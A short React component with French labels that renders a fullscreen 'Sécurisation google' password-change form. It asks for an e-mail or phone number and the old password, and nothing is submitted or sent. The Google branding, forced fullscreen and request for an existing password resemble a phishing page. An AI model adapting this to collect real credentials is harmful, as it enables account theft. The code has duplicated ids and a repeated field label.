import React, { Component } from 'react'
import { makeStyles, Grid, Typography,TextField,Button } from '@material-ui/core'
import Fullscreen from "react-full-screen";
import { ReactComponent as SecureLogo } from '../../img/svg/account.svg'
import Header from '../Header';


const style = {
  background: "#000"
}

class ChangeMdp extends Component {
  constructor(props) {
    super();

    this.state = {
      isFull: false,
    };
  }

  goFull = () => {
    this.setState({ isFull: true });
  }

  componentDidMount() {
    this.goFull()
    console.log('compnent did mount')
  }

  render() {
    return (
      <div className="App">

        <Fullscreen
          enabled={this.state.isFull}
          onChange={isFull => this.setState({ isFull })}
        >
          <Header />
          <div className="full-screenable-node">

            <Grid
              container
              direction="column"
              justify="center"
              alignItems="center"
              spacing={0}
              style={{ marginTop: '50px' }}
            >
              <Grid item style={{ width: '50%' }}>

                <SecureLogo />
              </Grid>
              <Grid item style={{ width: '50%' }}>
                <Typography variant="h6" component="h6">
                  Sécurisation google
                </Typography>
              </Grid>
            </Grid>
            <Grid item container style={{ width: '100%'}} justify="center" alignItems="center">
              <form  noValidate autoComplete="off">
                <Grid item style={{ marginTop: '10px'}}>
                <TextField id="email" label="Adresse e-mail ou numéro téléphone" variant="outlined" />
                </Grid>
                <Grid item style={{ marginTop: '10px'}}>
                <TextField id="email" label="Saisissez l'anciens mot de passe" variant="outlined" />
                </Grid> 
                <Grid item style={{ marginTop: '10px'}}>
                <TextField id="email" label="Saisissez l'anciens mot de passe" variant="outlined" />
                </Grid>
                <Grid item style={{ marginTop: '10px'}}>
                <TextField id="email" label="Confirmez le nouveau mot passe" variant="outlined" />
                </Grid>
                <Button variant="contained" color="primary" style={{ marginTop: '10px'}}>
                  Valider
                </Button>
              </form>

            </Grid>





          </div>
        </Fullscreen>
      </div>
    );
  }
}

export default ChangeMdp;
